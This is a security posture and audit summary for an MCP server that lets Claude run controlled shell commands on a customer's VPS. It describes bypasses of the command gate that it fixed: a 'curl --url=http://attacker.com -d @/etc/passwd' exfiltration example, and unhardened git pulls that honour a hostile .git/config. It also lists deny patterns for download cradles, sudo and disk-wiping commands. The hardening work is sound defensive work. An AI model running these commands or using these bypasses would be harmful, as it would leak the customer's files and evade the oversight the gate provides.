# vps-control-mcp — security posture

Snapshot date: 2026-05-03 (final pre-marketplace audit).
Per-repo posture for `vps-control-mcp` only. The family-level
umbrella covering all three ForgeRift repos lives in
[forgerift-license-api/docs/security/POSTURE.md](https://github.com/ForgeRift/forgerift-license-api/blob/main/docs/security/POSTURE.md);
read that first for cross-cutting context.

## Scope

`vps-control-mcp` is an MCP server that gives Claude controlled,
audited access to a Linux VPS the customer operates. It runs on the
customer's VPS as a long-lived process (typically under PM2). The
plugin is published as an `.mcpb` archive built from this repo's
`main` branch.

## Findings owned by this repo

| ID | Severity | Status | Area | One-liner |
|---|---|---|---|---|
| F010 | MAJOR | fixed `bba65f6` | curl gate | `--url=URL` and `--proxy=URL` bypassed the localhost-only curl restriction, enabling exfil to any external URL |
| F011 | MINOR | fixed `bba65f6` | tests | Two stale curl tests had been failing on every `npm test` run because the implementation had carved curl out for localhost health checks |
| NF-S69-1 | MAJOR | fixed `c16f2ec` | docs | WHITEPAPER §"Authentication / licensing" claimed VPS POSTs to payments.forgerift.io with machine_id + product_id; code uses Supabase customers-table per-request token lookup. Section rewritten + new "What VPS does NOT do today" subsection (per-machine cap is LT-only, on roadmap) |
| NF-S69-2 | MAJOR | fixed `c16f2ec` | docs | README claimed "cryptographic audit trails" (audit.ts has no crypto) and RED-tier "no override possible" (BYPASS_BINARIES env exists). Wording corrected |
| NF-S69-3 | MAJOR | fixed `c16f2ec` | config | `src/config.ts` ALLOWED_PROCESSES default fallback was `['sharpedge-api','vps-mcp','forgerift-payments']` while comment + README claimed empty. Default emptied |
| NF-S69-4 | MINOR | fixed `c16f2ec` | docs | WHITEPAPER §"Data handling" outbound HTTP claim corrected (Supabase + api.anthropic.com, not payments.forgerift.io); audit log default path corrected to `${APP_DIR}/mcp-audit.log`; README version badge bumped to 1.13.2 |
| NF-S69-6 | MAJOR | fixed `<v1.13.4>` | run_approved_command / git | `validateGitArgs` allowed `git pull` / `git fetch` via escape hatch, but `run_approved_command` dispatch skipped GIT_HARDENING_FLAGS that the structured `git_pull` tool injects. Asymmetry let user-supplied `git pull` honour attacker-controlled local `.git/config` (core.sshCommand, etc). Same family as F010. Now blocked in `validateGitArgs`; structured `git_pull` remains the supported path |

The audit's other findings (F001-F009, F012, F013) sit on
`forgerift-license-api` or `local-terminal-mcp`; they're tracked in
the central `findings.csv` because the audit covers all three repos
as one product family.

## Hardening shipped in this audit

### F010 close-out (commit `bba65f6`)

**Problem.** `vps-control-mcp/src/tools.ts:1609` `validateCurlArgs`
walked args with `if (arg.startsWith('-')) continue;` so any flag-
shaped argument was waved through without inspection. Curl supports
the GNU-getopt long form `--url=URL` and `--proxy=URL`, neither of
which is positional, so a call like
`curl --url=http://attacker.com -d @/etc/passwd` bypassed the
localhost-only gate and would actually fetch the external URL while
attaching arbitrary file contents as the POST body. Since
`vps-control-mcp` runs on the customer's VPS where curl can read any
file the process has permission to read, this was a full data-exfil
channel.

**Fix.** The validator now:

  - Walks every arg (no skip on `-`-prefix).
  - Normalises `--key=value` to its value half before comparing.
  - Matches URLs by substring instead of by exact equality, so
    `localhost.attacker.com` and similar DNS-rebinding shapes are
    rejected.
  - Adds IPv6 `[::1]` to the allowed-host list.
  - Compares hosts case-insensitively (`HTTP://LOCALHOST` is now
    accepted, `HTTP://EVIL.COM` is now rejected).
  - Also covers `--proxy=URL` (was previously ignored entirely).

**Verification.** Targeted reproducer `scans/2026-05-03/curl-bypass-
repro.txt` (in the umbrella repo) covers 11 cases including
positional URL, `--url URL` separate-arg, `--url=URL`,
`--proxy=URL`, IPv6 `[::1]`, case-insensitive `HTTP://LOCALHOST`,
DNS-rebinding-shaped `localhost.attacker.com`. Pre-fix: `--url=` and
`--proxy=` returned `null` (allowed). Post-fix: all 11 cases produce
the expected verdict.

### F011 close-out (commit `bba65f6`)

Two test cases in `src/__tests__/security.test.ts` (lines 113 and
534) assumed the blanket data-exfil deny / not-on-allowlist behaviour,
but the implementation had carved curl out for localhost health
checks. The tests had been failing on every `npm test` run prior to
the audit. Refreshed alongside the F010 fix; `npm test` now passes
with no skipped or failing cases (562/562 pre-F010, 591/593 —>
593/593 post-F010 with the new `curl arg gate` describe block adding
9 cases).

## Post-audit drift cleanup (2026-05-03 evening)

Independent reviewer pass after F010/F011 surfaced four documentation
or config drifts in this repo. None were active code-path security
regressions; they were claims in customer-facing docs that did not
match what the code did, plus one config-default leak. Closed in
commit `c16f2ec`.

  - **NF-S69-1** -- WHITEPAPER §"Authentication / licensing" was
    written to mirror the LT POSTURE shape (POST to
    payments.forgerift.io with machine_id + product_id, calls
    `register_activation_with_cap`, enforces per-machine cap).
    `vps-control-mcp/src/auth.ts` does none of that -- it does
    per-request token lookup against Supabase `customers` with a
    plan-based check, with OAuth 2.0 + PKCE on top. Section
    rewritten. New "What VPS does NOT do today" subsection
    explicitly notes the per-machine cap is LT-only with VPS
    migration tracked as post-marketplace roadmap.
  - **NF-S69-2** -- README "cryptographic audit trails" overstatement
    removed (`src/audit.ts` has no crypto/HMAC, only secret-pattern
    redaction). RED-tier table row "no override possible" replaced
    with accurate "auditable opt-out via `BYPASS_BINARIES` env
    (logged as `[SECURITY-BYPASS]`)" -- BYPASS_BINARIES is in the
    same README's config table, so the prior wording was an
    intra-document contradiction.
  - **NF-S69-3** -- `src/config.ts` `ALLOWED_PROCESSES` default
    fallback emptied (was `['sharpedge-api', 'vps-mcp',
    'forgerift-payments']` -- the operator's personal process names
    leaking to every marketplace customer who did not set the env
    var). The in-code comment already claimed the default was empty,
    so this was a code/comment drift in addition to the leak.
  - **NF-S69-4** -- WHITEPAPER §"Data handling" outbound-HTTP claim
    corrected (Supabase + `api.anthropic.com` per the actual code
    paths in `auth.ts` + `tools.ts`, not `payments.forgerift.io`
    which VPS never calls). Audit log default path corrected to
    `${APP_DIR}/mcp-audit.log` to match `config.ts:84`. README
    version badge bumped 1.12.0 â†’ 1.13.2 to match `package.json`.

`npm test` 593/593 still pass. No code-behavior change for healthy
installs.

### NF-S69-6 close-out (v1.13.4)

Independent line-by-line audit of `src/tools.ts` after the doc-drift
sweep surfaced a defense-in-depth gap. The structured git tools all
inject `GIT_HARDENING_FLAGS` (10 `-c key=value` overrides for
`core.sshCommand`, `core.editor`, `core.pager`, `core.askpass`,
`credential.helper`, `protocol.ext.allow`, `protocol.file.allow`,
`core.fsmonitor`, `core.hooksPath`, `uploadpack.packObjectsHook`).
The escape-hatch `run_approved_command` path dispatches via
`exec(cmd, args)` with no flag injection -- so `git pull` via the
escape hatch ran unhardened, honouring whatever the local
`.git/config` carried for those keys. `validateGitArgs` now adds
`pull` and `fetch` to its `blocked` Set, forcing users through the
structured `git_pull` tool. `npm test` 593/593 pass.

## Command-execution model

`vps-control-mcp` runs every shell command through the same three-
layer pipeline as `local-terminal-mcp`, calibrated for the Linux
side instead of Windows:

1. **BLOCKED tier** — POSIX-flavoured deny patterns covering
   eval / eval-adjacent forms (`sh -c`, `bash -c`, `-Command` on
   `pwsh`, perl/python/ruby/groovy/scala/lua/julia/Rscript `-e`),
   download cradles (`wget` + pipe-to-shell, `curl` + pipe-to-shell,
   `base64 -d` + pipe-to-shell), shell-out fronts (`find ... -exec`
   evading the binary allowlist, `xargs` chained from untrusted
   input), privilege escalation (`sudo`, `su -`, `setcap`,
   `setuid`, `newgrp`), filesystem destruction at root scope,
   `mkfs` / `dd if=` / partition primitives, symlink farms.

2. **ALLOWLIST gate** — the binary must be on the positive allowlist.
   Each allowed binary has its own argv validator. Examples:

  - `curl` — URL must resolve to `localhost` / `127.0.0.1` /
    `[::1]` (post-F010 shape covers `--url=` and `--proxy=`).
  - `systemctl` — `--host=` / `--machine=` prefix-checks
    locked down to local-only (per F-S67-43 / S67 hardening). Combined
    short-flag expansion for systemctl too (per F-S67-55).
  - `service` — `--status-all` allowed (per F-S67-42).
  - `git` — same hooks-path neutralisation and credential-flag
    strip as `local-terminal-mcp`.

3. **AMBER vs GREEN tier** — elevated-but-allowed commands
   (`pm2 restart`, `apt-get update`, etc. in operator mode)
   require dry-run-first acknowledgement; the rest go through
   `execFileSync(shell:false)` with a scrubbed env, bounded timeout,
   stdout/stderr capture, and `scrubSecrets()` redaction.

## Other repo-local hardening shipped before this audit

The S67 hardening pass (commit `7b77e4b S68: security hardening v1.13.1
— all fifteenth-pass findings remediated`) addressed 19 individual
findings before the 2026-05-03 audit. Notable items still relevant to
the marketplace story:

  - `constantTimeEqual` length-timing leak fixed (commit `67fdf76`,
    F-S67-53).
  - `validateArgPath` allowlist tightened: removed
    `tr` / `cut` / `paste` / `jq` (commit `6c336a5`,
    F-S67-44).
  - `validateSystemctlArgs` `--host=` / `--machine=` prefix
    checks tightened (commit `b705bdd`, F-S67-43).
  - Combined short-flag expansion in `validateSystemctlArgs` (commit
    `71a7e91`, F-S67-55).
  - Per-field audit log arg capture caps replacing the flat 300-byte
    truncation (commit `f172d8f`, F-S67-54).
  - Pre-commit hook verifies `dist` freshness (commit `d11f753`,
    F-S67-56).

## Test coverage

`npm test` runs 593 cases across the deny list, the allowlist, the
per-binary arg validators, the bypass-corpus regression suite, and the
new `curl arg gate` describe block introduced by the F010 fix.

## Continuous monitoring

- `npm audit` re-run on dependency bumps.
- `npm test` runs in pre-commit hook (`.githooks/pre-commit`)
  alongside `dist` freshness verification and the merge-conflict
  artifact guard.
- License-validation telemetry lands in the central `license_events`
  Supabase table; bad keys / version drift / product-mismatch hits
  alert the operator via the cron sweep at `forgerift-license-api`.

## Methodology + raw evidence

- Cross-repo methodology lives in
  [forgerift-license-api/docs/security/methodology.md](https://github.com/ForgeRift/forgerift-license-api/blob/main/docs/security/methodology.md).
  The "Targeted bypass repro — curl `--url=` flag" entry is the
  F010 reproducer; the "Manual code review — MCP command-injection
  surface" entry is the broader pass that surfaced F010 + F011.
- Central `findings.csv` carries F010 + F011 rows with status,
  fix_commit, evidence path. Lives in the umbrella repo at
  `forgerift-license-api/docs/security/findings.csv`.

## Marketplace-submission readiness

- All findings owned by this repo are fixed.
- Central `findings.csv` has zero `open-needs-dustin` rows.
- `security:` commits pushed to `origin/main`: `bba65f6` (F010 + F011), `c16f2ec` (NF-S69 doc/config drift cleanup), and `<NF-S69-6 commit>` (NF-S69-6 git pull/fetch hardening, v1.13.4).
- POSTURE + WHITEPAPER in place.
- `npm test` 593/593 pass on `HEAD`.
